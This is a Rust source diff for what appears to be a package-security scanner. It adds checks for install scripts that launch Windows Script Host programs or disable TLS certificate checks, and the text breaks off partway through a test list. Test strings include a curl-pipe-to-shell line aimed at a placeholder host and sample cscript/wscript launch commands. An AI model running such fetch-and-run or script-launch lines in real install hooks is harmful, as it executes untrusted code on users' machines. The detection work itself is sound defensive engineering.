@@ -1661,12 +1661,25 @@ pub fn join_string_pieces(p: &Pack, text: &[u32]) -> PyStr {
 
 /// core.runs_dll
 pub fn runs_dll(p: &Pack, text: &[u32]) -> Option<PyStr> {
+    runs_dll_joined(p, text, None)
+}
+
+/// [`runs_dll`], the text's string pieces joined already when `joined` is given (the install-script test joins them
+/// once for it and [`runs_wsh`]).
+fn runs_dll_joined(p: &Pack, text: &[u32], joined: Option<&[u32]>) -> Option<PyStr> {
     if !has(text, "32") && !text.contains(&c('+')) {
         return None;
     }
-    let joined = join_string_pieces(p, text);
+    let mine;
+    let joined: &[u32] = match joined {
+        Some(j) => j,
+        None => {
+            mine = join_string_pieces(p, text);
+            &mine
+        }
+    };
     let system = p.strs("_SYSTEM_DLLS");
-    for view in [text, joined.as_slice()] {
+    for view in [text, joined] {
         if p.re("_DLL_LOADER_RE").search(view).is_none() {
             continue;
         }
@@ -1687,6 +1700,614 @@ pub fn runs_dll(p: &Pack, text: &[u32]) -> Option<PyStr> {
         }
     }
     None
+}
+
+/// Does `text` name a Windows Script Host launcher (`wscript`, `cscript`, `mshta`), in any ASCII case? One pass.
+fn names_wsh(text: &[u32]) -> bool {
+    let lower = |x: u32| if (0x41..=0x5A).contains(&x) { x + 0x20 } else { x };
+    let at = |i: usize, rest: &str| {
+        text.len() >= i + rest.len() && text[i..i + rest.len()].iter().zip(rest.chars()).all(|(&a, b)| lower(a) == b as u32)
+    };
+    (0..text.len()).any(|i| match lower(text[i]) {
+        0x77 | 0x63 => at(i + 1, "script"), // w, c
+        0x6D => at(i + 1, "shta"),          // m
+        _ => false,
+    })
+}
+
+/// The lexer a script's comments are blanked with before the RA-11 and RA-12 tests read it: the language its `#!`
+/// line names, when it has one (node and the other JavaScript runtimes: JavaScript; Python; a shell, whose comments
+/// `shell::script_without_comments` blanked before the test read the script, or any other program: none), else
+/// `lang` when it is JavaScript or Python (`deps::script_lang`: a .js, .mjs, .cjs, .ts… or .py file, or one with no
+/// extension and no `#!` line, what node runs). A batch file (`bat`: its REM and `::` lines blanked before the test
+/// read it, `bat_without_comments`), a command, a text of another language or none known: none, so `//` in a URL is
+/// not taken for a comment.
+fn comment_lexer(p: &Pack, text: &[u32], lang: Option<&str>) -> Option<&'static str> {
+    if pystr::starts_with(text, "#!") {
+        return match crate::hooks::shebang_lang(p, text) {
+            Some("js") => Some("js"),
+            Some("py") => Some("py"),
+            _ => None,
+        };
+    }
+    match lang {
+        Some("js") => Some("js"),
+        Some("py") => Some("py"),
+        _ => None,
+    }
+}
+
+/// A batch file's text (`.cmd`, `.bat`) with its comments blanked, which cmd does not run: each line whose first
+/// word is `rem` (any case, after the `@` that hides a line's echo) or which starts with `::`, blanked to its line
+/// break (offsets and lines kept). None when no line is a comment.
+pub fn bat_without_comments(text: &[u32]) -> Option<PyStr> {
+    let mut out = text.to_vec();
+    let mut any = false;
+    let mut start = 0usize;
+    while start <= text.len() {
+        let end = text[start..].iter().position(|&x| x == c('\n')).map_or(text.len(), |k| start + k);
+        let line = &text[start..end];
+        let mut i = line.iter().position(|&x| x != c(' ') && x != c('\t')).unwrap_or(line.len());
+        while line.get(i) == Some(&c('@')) {
+            i += 1;
+        }
+        let rest = &line[i..];
+        let rem = rest.len() >= 3
+            && rest[..3].iter().zip("rem".chars()).all(|(&a, b)| a == b as u32 || a == b.to_ascii_uppercase() as u32)
+            && rest.get(3).is_none_or(|&x| matches!(char::from_u32(x), Some(' ' | '\t' | '\r' | '.' | ':' | '/' | '\\' | ',' | ';' | '=')));
+        if rem || pystr::starts_with(&line[i..], "::") {
+            for x in &mut out[start..end] {
+                if *x != c('\r') {
+                    *x = c(' ');
+                }
+            }
+            any = true;
+        }
+        start = end + 1;
+    }
+    any.then_some(out)
+}
+
+/// RA-11: the Windows Script Host script an install script launches, or None — the launch, one line: the launcher, its
+/// options and the argument that makes it one. `_WSH_LAUNCHER_RE` (case-insensitive, so `CScript`, `WScript.exe`,
+/// `MSHTA.EXE` are caught) finds `wscript`, `cscript` or `mshta`, a drive and path before it allowed, not preceded or
+/// followed by another filename character (`node scripts/check-wscript.js`, `wscript.js` are files, not the launcher).
+/// It is a launch only where it runs (`wsh_launch_at`): the launcher is a command's program — in shell text at a
+/// command's start, or the program of an exec call in code — and its first argument that is not an option (`//nologo`,
+/// `//B`, `//E:jscript`, `/e:vbscript`, `-ArgumentList`: skipped) is on the same line and is a script file
+/// (`launcher.vbs`, `C:\x\run.js`, `http://…/a.hta`: `_WSH_SCRIPT_RE`), or, after `//E:` names the engine, any
+/// file; or, in code, not a literal (`wsh_words`, `wsh_argv`). A name in prose (`run cscript setup.vbs to finish`), a
+/// comment, a LOLBin list (`['mshta.exe', 'wscript.exe']`) or a word on the next line is none. A JavaScript or Python
+/// text is read with its comments (and Python's docstrings) blanked, in the lexer of its real language
+/// (`comment_lexer`); a shell script's and a batch file's comments are blanked before the test reads it, a build
+/// script's by the Rust reader. Like [`runs_dll`], the text's string pieces are joined too, so a launcher assembled
+/// from pieces is caught (`'wsc'+'ript x.v'+'bs'`). The text is lexed and joined only when it, or its pieces joined,
+/// name a launcher (a bundle's `+` and its `description`s cost nothing more).
+pub fn runs_wsh(p: &Pack, text: &[u32], lang: Option<&str>) -> Option<PyStr> {
+    runs_wsh_joined(p, text, lang, None)
+}
+
+/// [`runs_wsh`], the text's string pieces joined already when `raw_joined` is given (the install-script test joins
+/// them once for it and [`runs_dll`]).
+fn runs_wsh_joined(p: &Pack, text: &[u32], lang: Option<&str>, raw_joined: Option<&[u32]>) -> Option<PyStr> {
+    let pieces = text.contains(&c('+'));
+    let raw: Option<PyStr> = if pieces && raw_joined.is_none() { Some(join_string_pieces(p, text)) } else { None };
+    let raw_joined = raw_joined.or(raw.as_deref());
+    if !names_wsh(text) && !(pieces && raw_joined.is_some_and(names_wsh)) {
+        return None;
+    }
+    let lexer = comment_lexer(p, text, lang);
+    let code: PyStr = match lexer {
+        Some(l) => import_code(p, text, l),
+        None => text.to_vec(),
+    };
+    let joined: PyStr = match (pieces, lexer) {
+        (false, _) => Vec::new(),
+        (true, None) => raw_joined.map(|j| j.to_vec()).unwrap_or_default(),
+        (true, Some(_)) => join_string_pieces(p, &code),
+    };
+    for view in [code.as_slice(), joined.as_slice()] {
+        if view.is_empty() || !names_wsh(view) {
+            continue;
+        }
+        if let Some(found) = wsh_launch(p, view) {
+            return Some(found);
+        }
+    }
+    None
+}
+
+/// What [`wsh_launch`] reads after a launcher, at most (its arguments and, in code, the elements of its argv).
+const WSH_AHEAD: usize = 400;
+/// What [`wsh_command_start`] reads before a launcher, at most (the command's words before it).
+const WSH_BEFORE: usize = 300;
+
+/// [`runs_wsh`]'s reading of one view: the first launcher that launches a script, as the launch is shown.
+fn wsh_launch(p: &Pack, view: &[u32]) -> Option<PyStr> {
+    const MAX_NAMES: usize = 64; // the launchers read in one view
+    let mut quotes = LineQuotes::default();
+    for (k, m) in p.re("_WSH_LAUNCHER_RE").finditer(view).enumerate() {
+        if k >= MAX_NAMES {
+            break;
+        }
+        let (s, e) = (m.start(), m.end());
+        // a file named after a launcher (`wscript.js`, `cscript-check`) is not one
+        if view.get(e).is_some_and(|&x| x == c('.') || x == c('-') || word_char(x)) {
+            continue;
+        }
+        let (ls, open) = quotes.at(view, s);
+        if let Some(words) = wsh_launch_at(p, view, s, e, ls, open) {
+            let parts: Vec<&[u32]> = words.iter().map(|w| w.as_slice()).collect();
+            let shown = pystr::join(&u(" "), &parts);
+            return Some(head(&shown, 60).to_vec());
+        }
+    }
+    None
+}
+
+fn word_char(x: u32) -> bool {
+    char::from_u32(x).is_some_and(|ch| ch.is_alphanumeric() || ch == '_')
+}
+
+fn blank_char(x: u32) -> bool {
+    matches!(x, 0x09 | 0x0B | 0x0C | 0x0D | 0x20)
+}
+
+/// A left-to-right reading of a view's lines, for the launchers [`wsh_launch`] finds in order: where a launcher's
+/// line starts and the string it is in (its opening quote's offset and character: `'`, `"` or a backtick), a string
+/// read to its line's end (one that goes on is read a line at a time).
+#[derive(Default)]
+struct LineQuotes {
+    line: usize,
+    pos: usize,
+    open: Option<(usize, u32)>,
+}
+
+impl LineQuotes {
+    fn at(&mut self, view: &[u32], s: usize) -> (usize, Option<(usize, u32)>) {
+        let mut i = self.pos;
+        while i < s {
+            let x = view[i];
+            if x == c('\n') {
+                self.line = i + 1;
+                self.open = None;
+            } else if x == c('\\') && view.get(i + 1).is_some_and(|&y| y != c('\n')) {
+                i += 1; // (an escaped character: not a quote)
+            } else if let Some((_, q)) = self.open {
+                if x == q {
+                    self.open = None;
+                }
+            } else if x == c('\'') || x == c('"') || x == c('`') {
+                self.open = Some((i, x));
+            }
+            i += 1;
+        }
+        self.pos = i.max(s);
+        (self.line, self.open)
+    }
+}
+
+/// Is the launcher at `view[s..e]` (its line starting at `ls`, in the string that `open` opens) a launch? Some(the
+/// launch's words) when it is. Not in a string, the launcher must be at a command's start ([`wsh_command_start`])
+/// and its argument follow on its line (`cscript //nologo x.vbs`, `cmd /c start "" wscript x.js`). In a string, the
+/// string's text before it must be a command's start too (`'cscript x.vbs'`, `'cmd /c cscript x.vbs'`, `` `npm i &&
+/// cscript ${f}` ``), and the string itself stand where a command line does — a shell's command (`sh -c '…'`,
+/// `powershell -c "Start-Process wscript …"`) or code's ([`code_string_at`]: an argument, a value assigned); its
+/// argument is read in the string (`` `cscript ${f}` ``, `'cscript %s' % f`, `f'cscript {p}'`) or, when the string
+/// ends first, is what is joined to it (`'cscript ' + path.join(d, 'x.vbs')`). A launcher alone in its string is a
+/// program in argv form (`spawn('wscript', ['x.js'])`, `['cscript.exe', '//nologo', script]`: [`wsh_argv`]) or a
+/// shell's quoted program (`"cscript.exe" x.vbs`).
+fn wsh_launch_at(p: &Pack, view: &[u32], s: usize, e: usize, ls: usize, open: Option<(usize, u32)>) -> Option<Vec<PyStr>> {
+    let script = p.re("_WSH_SCRIPT_RE");
+    // the launcher's line, read at most WSH_AHEAD past it (a minified line is not read to its end for each launcher)
+    let cap = view.len().min(e + 1 + WSH_AHEAD);
+    let le = view[e..cap].iter().position(|&x| x == c('\n')).map_or(cap, |k| e + k);
+    let launcher = view[s..e].to_vec();
+    let with = |words: Vec<PyStr>| {
+        let mut out = vec![launcher.clone()];
+        out.extend(words);
+        Some(out)
+    };
+    let Some((q, qc)) = open else {
+        if !wsh_command_start(p, &view[ls..s], 0) {
+            return None;
+        }
+        return match wsh_words(view, e, le.min(e + WSH_AHEAD), script) {
+            Words::Launch(w) => with(w),
+            _ => None,
+        };
+    };
+    let seg = &view[q + 1..s];
+    if !wsh_command_start(p, seg, 0) {
+        return None;
+    }
+    let close = string_close(view, e, le, qc);
+    if close == Some(e) && seg.iter().all(|&x| blank_char(x)) {
+        // the launcher alone in its string: a program in argv form, or a shell's quoted program
+        if argv_context(p, view, q) {
+            if let Some(w) = wsh_argv(view, e + 1, script) {
+                return with(w);
+            }
+        }
+        if wsh_command_start(p, &view[ls..q], 0) {
+            if let Words::Launch(w) = wsh_words(view, e + 1, le.min(e + 1 + WSH_AHEAD), script) {
+                return with(w);
+            }
+        }
+        return None;
+    }
+    if !(wsh_command_start(p, &view[ls..q], 0) || code_string_at(view, ls, q)) {
+        return None;
+    }
+    let end = close.unwrap_or(le).min(e + WSH_AHEAD);
+    match wsh_words(view, e, end, script) {
+        Words::Launch(w) => with(w),
+        Words::NoArgument(mut opts) => {
+            // the string ends before an argument: what is joined to it is one (`'cscript ' + path.join(…)`)
+            let c0 = close?;
+            let mut i = c0 + 1;
+            while i < le && blank_char(view[i]) {
+                i += 1;
+            }
+            if view.get(i) != Some(&c('+')) {
+                return None;
+            }
+            i += 1;
+            while i < le && blank_char(view[i]) {
+                i += 1;
+            }
+            let expr = expression_at(view, i, le);
+            if expr.is_empty() {
+                return None;
+            }
+            opts.push(u("+"));
+            opts.push(expr);
+            with(opts)
+        }
+        Words::NotALaunch => None,
+    }
+}
+
+/// The offset of the quote `qc` that closes the string a launcher ending at `from` is in, on its line (before `le`),
+/// else None; a template's `${…}` is read past.
+fn string_close(view: &[u32], from: usize, le: usize, qc: u32) -> Option<usize> {
+    let mut i = from;
+    let mut depth = 0usize;
+    while i < le {
+        let x = view[i];
+        if x == c('\\') {
+            i += 2;
+            continue;
+        }
+        if qc == c('`') && x == c('$') && view.get(i + 1) == Some(&c('{')) {
+            depth += 1;
+            i += 2;
+            continue;
+        }
+        if depth > 0 {
+            if x == c('}') {
+                depth -= 1;
+            }
+        } else if x == qc {
+            return Some(i);
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Does a string whose quote is at `q` stand where code puts a command line it runs or builds: an argument (after
+/// `(` or `,`), a list's element, a value assigned or joined (`=`, `+`, `:`), or what `return` gives? A Python
+/// string's prefix (`f`, `r`, `b`) is read past. Prose an `echo` or a `log` word prints is not (`echo 'cscript …'`).
+fn code_string_at(view: &[u32], ls: usize, q: usize) -> bool {
+    let mut i = q;
+    if q >= ls + 2 && view[q - 1] == view[q] && view[q - 2] == view[q] {
+        i = q - 2; // (a Python triple-quoted string: its first quote)
+    }
+    let mut letters = 0;
+    while i > ls && letters < 2 && matches!(char::from_u32(view[i - 1]), Some('f' | 'F' | 'r' | 'R' | 'b' | 'B' | 'u' | 'U')) {
+        i -= 1;
+        letters += 1;
+    }
+    if letters > 0 && i > ls && word_char(view[i - 1]) {
+        i += letters; // (a word that ends in one of those letters, not a prefix)
+    }
+    while i > ls && blank_char(view[i - 1]) {
+        i -= 1;
+    }
+    if i == ls {
+        return true;
+    }
+    let x = view[i - 1];
+    if matches!(char::from_u32(x), Some('(' | '[' | ',' | '=' | '+' | ':' | '{' | '?' | '!' | '&' | '|' | '>')) {
+        return true;
+    }
+    if word_char(x) {
+        let mut j = i;
+        while j > ls && word_char(view[j - 1]) {
+            j -= 1;
+        }
+        return pystr::eq(&view[j..i], "return") || pystr::eq(&view[j..i], "yield");
+    }
+    false
+}
+
+/// Is the string whose quote is at `q` the first element of an argv: a list's (`['cscript.exe', …]`) or an exec
+/// call's (`spawn('wscript', …)`, `execFile(…)`, `Command::new(…)`: `_WSH_EXEC_RE`)?
+fn argv_context(p: &Pack, view: &[u32], q: usize) -> bool {
+    let mut i = q;
+    while i > 0 && (blank_char(view[i - 1]) || view[i - 1] == c('\n')) {
+        i -= 1;
+    }
+    match view.get(i.wrapping_sub(1)).copied() {
+        Some(x) if i > 0 && x == c('[') => true,
+        Some(x) if i > 0 && x == c('(') => {
+            let before = &view[i.saturating_sub(61)..i - 1];
+            p.re("_WSH_EXEC_RE").search(before).is_some()
+        }
+        _ => false,
+    }
+}
+
+/// What a launcher's arguments are, read as a shell's words.
+enum Words {
+    /// a launch: its options and the argument that makes it one
+    Launch(Vec<PyStr>),
+    /// no argument before the end: the options read
+    NoArgument(Vec<PyStr>),
+    /// its first argument is another word: not a launch
+    NotALaunch,
+}
+
+/// The arguments after a launcher (`view[from..end]`), as a shell's words (quotes taken off), to the end or the first
+/// command separator (`;` `&` `|` `(` `)` `<` `>`): options skipped (a word that starts `/` or `-`; `//E:` or `/E:`
+/// names the engine, so any file after it is a script), the first other word decides — a script file
+/// (`_WSH_SCRIPT_RE`), or not a literal (`$f`, `${f}`, `$(…)`, `%f%`, `%1`, `%s`, `{p}`, a backtick).
+fn wsh_words(view: &[u32], from: usize, end: usize, script: &crate::pyre::Regex) -> Words {
+    let sep = |x: u32| matches!(char::from_u32(x), Some(';' | '&' | '|' | '(' | ')' | '<' | '>'));
+    let (mut i, mut opts, mut engine) = (from, Vec::new(), false);
+    loop {
+        while i < end && blank_char(view[i]) {
+            i += 1;
+        }
+        if i >= end || sep(view[i]) {
+            return Words::NoArgument(opts);
+        }
+        // a word: to a blank or a separator outside quotes, a `${…}` read whole
+        let start = i;
+        let mut quote: Option<u32> = None;
+        let mut closers: Vec<u32> = Vec::new(); // a `${…}` or `$(…)` read whole
+        while i < end {
+            let x = view[i];
+            if let Some(q) = quote {
+                if x == q {
+                    quote = None;
+                }
+            } else if let Some(&closer) = closers.last() {
+                if x == closer {
+                    closers.pop();
+                } else if x == c('$') && matches!(view.get(i + 1), Some(&y) if y == c('{') || y == c('(')) {
+                    closers.push(if view[i + 1] == c('{') { c('}') } else { c(')') });
+                    i += 1;
+                }
+            } else if x == c('$') && matches!(view.get(i + 1), Some(&y) if y == c('{') || y == c('(')) {
+                closers.push(if view[i + 1] == c('{') { c('}') } else { c(')') });
+                i += 1;
+            } else if x == c('\'') || x == c('"') {
+                quote = Some(x);
+            } else if blank_char(x) || sep(x) {
+                break;
+            }
+            i += 1;
+        }
+        let raw = &view[start..i.min(end)];
+        let word: PyStr = raw.iter().copied().filter(|&x| x != c('\'') && x != c('"')).collect();
+        if word.is_empty() {
+            continue;
+        }
+        if script.search(&word).is_some() {
+            opts.push(word);
+            return Words::Launch(opts);
+        }
+        if matches!(char::from_u32(word[0]), Some('/' | '-')) {
+            let lower = pystr::lower(&word);
+            engine |= pystr::starts_with(&lower, "//e:") || pystr::starts_with(&lower, "/e:");
+            opts.push(word);
+            continue;
+        }
+        if engine || matches!(char::from_u32(word[0]), Some('$' | '%' | '{' | '`')) {
+            opts.push(word);
+            return Words::Launch(opts);
+        }
+        return Words::NotALaunch;
+    }
+}
+
+/// The elements after an argv's program (`view[from..]`, past its closing quote): its options skipped (`'//nologo'`;
+/// `'//E:jscript'` names the engine), the first other element decides — a script file, or not a literal (a variable,
+/// a call, a template with `${…}`, an f-string with `{…}`: `subprocess.run(['wscript', p])`). Elements may be on
+/// lines of their own; the argv's list may be the call's next argument (`spawn('wscript', ['x.js'])`), or what a
+/// Rust `Command` is given next (`.arg("x.vbs")`, `.args(&["//nologo", "x.vbs"])`). Some(the options and that element).
+fn wsh_argv(view: &[u32], from: usize, script: &crate::pyre::Regex) -> Option<Vec<PyStr>> {
+    let end = view.len().min(from + WSH_AHEAD);
+    let (mut i, mut opts, mut engine) = (from, Vec::new(), false);
+    loop {
+        while i < end && (blank_char(view[i]) || matches!(char::from_u32(view[i]), Some('\n' | ',' | '[' | '&'))) {
+            i += 1;
+        }
+        if i >= end {
+            return None;
+        }
+        let x = view[i];
+        if x == c(')') {
+            let rest = &view[i + 1..];
+            if pystr::starts_with(rest, ".arg(") {
+                i += 6;
+                continue;
+            }
+            if pystr::starts_with(rest, ".args(") {
+                i += 7;
+                continue;
+            }
+            return None;
+        }
+        if x == c(']') || x == c('}') || x == c(';') {
+            return None;
+        }
+        // a string literal, a Python prefix read past
+        let mut j = i;
+        let mut fstring = false;
+        while j < end && j - i < 2 && matches!(char::from_u32(view[j]), Some('f' | 'F' | 'r' | 'R' | 'b' | 'B' | 'u' | 'U')) {
+            fstring |= view[j] == c('f') || view[j] == c('F');
+            j += 1;
+        }
+        let q = view.get(j).copied().unwrap_or(0);
+        if j < end && (q == c('\'') || q == c('"') || q == c('`')) {
+            let line_end = view[j + 1..end].iter().position(|&y| y == c('\n')).map_or(end, |k| j + 1 + k);
+            let close = string_close(view, j + 1, line_end, q)?;
+            let lit = view[j + 1..close].to_vec();
+            i = close + 1;
+            if script.search(&lit).is_some() {
+                opts.push(lit);
+                return Some(opts);
+            }
+            if lit.first().is_some_and(|&y| y == c('/') || y == c('-')) {
+                let lower = pystr::lower(&lit);
+                engine |= pystr::starts_with(&lower, "//e:") || pystr::starts_with(&lower, "/e:");
+                opts.push(lit);
+                continue;
+            }
+            let substituted = (q == c('`') && pystr::contains(&lit, "${")) || (fstring && lit.contains(&c('{')));
+            if substituted || (engine && !lit.is_empty()) {
+                opts.push(lit);
+                return Some(opts);
+            }
+            return None;
+        }
+        // not a literal: a variable, a call
+        let le = view[i..end].iter().position(|&y| y == c('\n')).map_or(end, |k| i + k);
+        let expr = expression_at(view, i, le);
+        if expr.is_empty() {
+            return None;
+        }
+        opts.push(expr);
+        return Some(opts);
+    }
+}
+
+/// The expression at `view[i..]` (a variable, a call, a member), to a `,` `)` `]` `}` or `;` outside its own
+/// brackets and strings, or `le`; at most 80 characters, one line.
+fn expression_at(view: &[u32], i: usize, le: usize) -> PyStr {
+    let end = le.min(i + 80);
+    let (mut j, mut depth, mut quote) = (i, 0usize, None::<u32>);
+    while j < end {
+        let x = view[j];
+        if let Some(q) = quote {
+            if x == c('\\') {
+                j += 2;
+                continue;
+            }
+            if x == q {
+                quote = None;
+            }
+        } else if x == c('\'') || x == c('"') || x == c('`') {
+            quote = Some(x);
+        } else if x == c('(') || x == c('[') || x == c('{') {
+            depth += 1;
+        } else if x == c(')') || x == c(']') || x == c('}') {
+            if depth == 0 {
+                break;
+            }
+            depth -= 1;
+        } else if depth == 0 && (x == c(',') || x == c(';')) {
+            break;
+        }
+        j += 1;
+    }
+    let got = &view[i..j.min(end)];
+    let got = pystr::strip(got);
+    got.iter().map(|&x| if blank_char(x) { c(' ') } else { x }).collect()
+}
+
+/// Is the end of `seg` (the text before a launcher, from its line's or its string's start) a command's start? No word
+/// of the command before it — a line's or a string's start, or just after `;` `&` `|` `(` `)` or a backtick (so `&&`,
+/// `||` and `$(` too) — or only a wrapper that runs the command it is given (`_WSH_WRAPPERS`: `cmd /c`, `start ""`,
+/// `call`, `powershell -c`, `Start-Process -FilePath`, `sh -c`, `exec`, `then`): the command's first word a wrapper and
+/// its last a wrapper, an option of one or a quoted title, after any `NAME=value` and a batch line's `@`. A string
+/// still open at the end (`powershell -c 'cscript …`) is a command line of its own, at a command's start in turn.
+fn wsh_command_start(p: &Pack, seg: &[u32], depth: usize) -> bool {
+    let seg = &seg[seg.len().saturating_sub(WSH_BEFORE)..];
+    let mut words: Vec<(usize, usize)> = Vec::new();
+    let (mut start, mut quote): (Option<usize>, Option<(usize, u32)>) = (None, None);
+    let mut i = 0;
+    while i < seg.len() {
+        let x = seg[i];
+        if let Some((_, q)) = quote {
+            if x == c('\\') && q != c('\'') {
+                i += 2;
+                continue;
+            }
+            if x == q {
+                quote = None;
+            }
+        } else if blank_char(x) || x == c('\n') {
+            if let Some(s0) = start.take() {
+                words.push((s0, i));
+            }
+        } else if matches!(char::from_u32(x), Some(';' | '&' | '|' | '(' | ')' | '`')) {
+            start = None;
+            words.clear();
+        } else {
+            if start.is_none() {
+                start = Some(i);
+            }
+            if x == c('\'') || x == c('"') {
+                quote = Some((i, x));
+            }
+        }
+        i += 1;
+    }
+    if let Some((at, _)) = quote {
+        // the launcher is in a string the command gives (`powershell -c '…`): that string's text, and its place
+        return depth < 3 && wsh_command_start(p, &seg[at + 1..], depth + 1) && wsh_command_start(p, &seg[..at], depth + 1);
+    }
+    if let Some(s0) = start {
+        words.push((s0, seg.len()));
+    }
+    let assign = |w: &[u32]| {
+        let k = w.iter().position(|&x| x == c('=')).unwrap_or(0);
+        k > 0 && w[..k].iter().all(|&x| word_char(x)) && !(0x30..=0x39).contains(&w[0])
+    };
+    let mut ws: Vec<&[u32]> = words.iter().map(|&(a, b)| &seg[a..b]).collect();
+    if let Some(first) = ws.first_mut() {
+        while first.first() == Some(&c('@')) {
+            *first = &first[1..];
+        }
+    }
+    ws.retain(|w| !w.is_empty());
+    let skip = ws.iter().take_while(|w| assign(w)).count();
+    let ws = &ws[skip..];
+    let (Some(first), Some(last)) = (ws.first(), ws.last()) else { return true };
+    let wrappers = p.strs("_WSH_WRAPPERS");
+    let wrapper = |w: &[u32]| {
+        let name = program_name(w);
+        wrappers.iter().any(|x| *x == name)
+    };
+    wrapper(first) && (wrapper(last) || matches!(char::from_u32(last[0]), Some('-' | '/' | '"' | '\'')))
+}
+
+/// A command word's program name: its quotes, a path before it and a `.exe` after it taken off, lowercase.
+fn program_name(w: &[u32]) -> PyStr {
+    let w: PyStr = w.iter().copied().filter(|&x| x != c('"') && x != c('\'')).collect();
+    let base = match w.iter().rposition(|&x| x == c('/') || x == c('\\')) {
+        Some(k) => &w[k + 1..],
+        None => &w[..],
+    };
+    let lower = pystr::lower(base);
+    match lower.len().checked_sub(4) {
+        Some(k) if pystr::eq(&lower[k..], ".exe") => lower[..k].to_vec(),
+        _ => lower,
+    }
 }
 
 // ---------------- names in strings a file decodes as it runs ----------------
@@ -3456,10 +4077,20 @@ pub fn install_script_risk(p: &Pack, text: &[u32], lang: Option<&str>) -> Vec<Py
 /// core.install_script_risk(text, shell, command, lang): `shell`, read a
 /// shell script with the shell reader; `command`, the text is a hook's
 /// command; `lang`, the script's language when known ("js", "py": its
-/// strings are read as its runtime reads them). A shell script is read
-/// without its comments, which no shell runs, unless it reads its own file
-/// (SH-COMMENT-FP, 0.1.9: `shell::script_without_comments`).
+/// strings are read as its runtime reads them; "bat", a batch file:
+/// `deps::script_lang`). A shell script is read without its comments, which
+/// no shell runs, unless it reads its own file (SH-COMMENT-FP, 0.1.9:
+/// `shell::script_without_comments`); a batch file without its REM and ::
+/// lines (`bat_without_comments`).
 pub fn install_script_risk_with(p: &Pack, text: &[u32], shell: bool, command: bool, lang: Option<&str>) -> Vec<PyStr> {
+    if shell && !command && lang == Some("bat") && !pystr::starts_with(text, "#!") {
+        // a batch file (deps::script_lang): read without its REM and :: lines, which cmd does not run
+        if let Some(bare) = bat_without_comments(text) {
+            let _gate = crate::textgate::open(&bare);
+            return install_script_risk_text(p, &bare, shell, command, lang);
+        }
+        return install_script_risk_text(p, text, shell, command, lang);
+    }
     if shell && !command {
         if let Some(bare) = crate::shell::script_without_comments(p, text, lang) {
             let _gate = crate::textgate::open(&bare);
@@ -3747,8 +4378,17 @@ fn install_script_risk_of(p: &Pack, text: &[u32], shell: bool, command: bool, la
     if p.re("_NPM_TOKEN_READ_RE").search(text).is_some() {
         reasons.push(u("collects npm access tokens"));
     }
-    if let Some(dll) = runs_dll(p, text) {
+    // (the text's string pieces joined once, for the DLL and the Windows Script Host launchers)
+    let joined = if text.contains(&c('+')) { Some(join_string_pieces(p, text)) } else { None };
+    if let Some(dll) = runs_dll_joined(p, text, joined.as_deref()) {
         reasons.push(cat(&[&u("runs a DLL with rundll32 or regsvr32 ("), head(&dll, 40), &u(")")]));
+    }
+    if let Some(wsh) = runs_wsh_joined(p, text, lang, joined.as_deref()) {
+        reasons.push(cat(&[&u("runs a script with the Windows Script Host ("), &wsh, &u(")")]));
+    }
+    if turns_off_certificates(p, text, lang) {
+        // (a weaker reason: install_script_severity)
+        push_new(&mut reasons, p.strs("_WEAK_INSTALL_REASONS")[0].clone());
     }
     if let Some(m) = model {
         if let Some((_, r)) = &m.dropped {
@@ -3879,6 +4519,42 @@ fn dropped_reason(text: &[u32], lang: Option<&str>) -> Option<(usize, PyStr)> {
         cat(&[&u("downloads a script and runs it with "), d.interp.as_ref()?])
     };
     Some((d.line, reason))
+}
+
+/// core.install_script_severity (RA-12, 0.1.9): how strong the install-script test's reasons are, for every
+/// finding made of them (an install hook and the scripts it runs, an sdist's setup.py, a build script or a
+/// procedural macro, a start-up module, a .pth line, what an editor's or agent's settings run, an agent doc's
+/// commands): "MAJOR" when each is a weaker reason (_WEAK_INSTALL_REASONS: TLS certificate verification turned
+/// off), else "CRITICAL"; None for no reasons (no finding is made of them: the caller's own severity stands). A
+/// reason is read by its start, so what follows it (the decoded view's note) changes nothing.
+pub fn install_script_severity(p: &Pack, reasons: &[PyStr]) -> Option<&'static str> {
+    if reasons.is_empty() {
+        return None;
+    }
+    let weak = p.strs("_WEAK_INSTALL_REASONS");
+    Some(if reasons.iter().all(|r| weak.iter().any(|w| r.starts_with(w))) { "MAJOR" } else { "CRITICAL" })
+}
+
+/// Is any of `reasons` a strong one (install_script_severity CRITICAL)?
+pub fn strong_install_reasons(p: &Pack, reasons: &[PyStr]) -> bool {
+    install_script_severity(p, reasons) == Some("CRITICAL")
+}
+
+/// RA-12: code that turns off TLS certificate verification (_CERT_OFF_RE), not prose about it: a JavaScript or
+/// Python text is read with its comments (and Python's string statements, its docstrings) blanked, as `import_code`
+/// blanks them, in the lexer of the script's real language (`comment_lexer`: its `#!` line's, else `lang`'s), so a
+/// shell script's or a batch file's `https://…` is not taken for a JavaScript comment; a shell script's comments
+/// are blanked before the test reads it (`shell::script_without_comments`), a batch file's REM and `::` lines too
+/// (`bat_without_comments`), and a build script's by the Rust reader (rsread's view).
+fn turns_off_certificates(p: &Pack, text: &[u32], lang: Option<&str>) -> bool {
+    let re = p.re("_CERT_OFF_RE");
+    if re.search(text).is_none() {
+        return false;
+    }
+    match comment_lexer(p, text, lang) {
+        Some(l) => re.search(&import_code(p, text, l)).is_some(),
+        None => true,
+    }
 }
 
 // ---------------- the import-time test ----------------
@@ -4880,5 +5556,82 @@ mod comment_tests {
         assert_eq!(risk(own, None), vec![pipe.clone()]);
         // a here-document's body is not a comment
         assert_eq!(risk("#!/bin/sh\n# setup\nsh <<'EOF'\n# curl -s https://x.invalid/i | sh\nEOF\n", None), vec![pipe]);
+    }
+}
+
+#[cfg(test)]
+mod wsh_review_tests {
+    // The review of RA-12 / RA-11 (0298bd6): the WSH launcher matched where it runs, its launch shown alone, and a
+    // script's comments blanked in its own language. Inert text: hosts are example.com or 192.0.2.x.
+    use super::*;
+    use crate::pack;
+
+    fn launch(text: &str, lang: Option<&str>) -> Option<String> {
+        let p = pack::current();
+        runs_wsh(&p, &u(text), lang).map(|x| pystr::to_string(&x))
+    }
+
+    #[test]
+    fn a_launch_in_code_and_in_shell_text() {
+        for (text, lang, shown) in [
+            ("cp.exec('cscript ' + path.join(__dirname, 'x.vbs'));\n", Some("js"), "cscript + path.join(__dirname, 'x.vbs')"),
+            ("cp.execSync(`cscript ${__dirname}/run.vbs`);\n", Some("js"), "cscript ${__dirname}/run.vbs"),
+            ("cp.execSync(`cscript ${f}`);\n", Some("js"), "cscript ${f}"),
+            ("cp.spawn('wscript', ['x.js']);\nconst later = 1;\n", Some("js"), "wscript x.js"),
